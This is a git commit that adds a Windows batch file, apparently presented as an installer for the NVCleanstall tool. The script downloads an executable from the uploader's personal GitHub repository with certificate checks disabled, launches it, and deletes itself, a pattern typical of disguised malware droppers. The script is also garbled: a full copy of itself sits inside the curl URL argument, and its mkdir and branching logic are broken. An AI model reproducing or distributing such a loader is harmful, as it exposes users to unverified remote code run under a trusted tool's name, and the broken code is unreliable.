b369e0bc3232499599595adcd8dac966db5c9b67
checkmate69 <60278795+checkmate69@users.noreply.github.com>
2024-08-14 20:19:45 +0200

    Add files via upload

---
+++ NvCleanInstall.bat
@@ -0,0 +1,70 @@
+color 6
+@echo off
+SETLOCAL ENABLEDELAYEDEXPANSION
+
+
+Mode 105,30
+
+
+:1482184812581257178
+cls
+echo.
+echo.
+mkdir "%USERPROFILE%\NVCleanstall_1.16.0.exe"
+if exist "%USERPROFILE%\Desktop\NVCleanstall_1.16.0.exe" (
+curl -g -k -L -# -o "%USERPROFILE%\Desktop\NVCleanstall_1.16.0.exe"       "color 6
+@echo off
+SETLOCAL ENABLEDELAYEDEXPANSION
+
+
+Mode 105,30
+
+
+:1482184812581257178
+cls
+echo.
+echo.
+mkdir "%USERPROFILE%\Desktop\NVCleanstall_1.16.0.exe"
+if exist "%USERPROFILE%\Desktop\NVCleanstall_1.16.0.exe" (
+curl -g -k -L -# -o "%USERPROFILE%\Desktop\NVCleanstall_1.16.0.exe"       "https://github.com/checkmate69/rzeczy/raw/main/NVCleanstall_1.16.0.exe"
+)
+
+) ELSE (
+
+start "" "%USERPROFILE%\Desktop\NVCleanstall_1.16.0.exe"
+pause>nul
+cls
+del %0
+
+
+
+
+
+
+
+
+
+
+
+
+"
+)
+
+) ELSE (
+
+start "" "%USERPROFILE%\Desktop\NVCleanstall_1.16.0.exe"
+pause>nul
+cls
+del %0
+
+
+
+
+
+
+
+
+
+
+
+
